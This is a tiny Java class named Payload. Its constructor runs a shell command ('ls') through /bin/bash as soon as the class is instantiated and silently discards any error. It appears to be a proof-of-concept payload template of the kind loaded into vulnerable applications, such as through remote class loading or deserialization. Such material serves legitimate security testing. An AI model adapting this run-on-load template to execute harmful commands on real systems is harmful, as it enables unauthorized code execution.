public class Payload {
  public Payload() {
    try {
      String payload = "ls";
      String[] cmds = { "/bin/bash", "-c", payload };
      java.lang.Runtime.getRuntime().exec(cmds);
    } catch (Exception e) {
    }
  }
}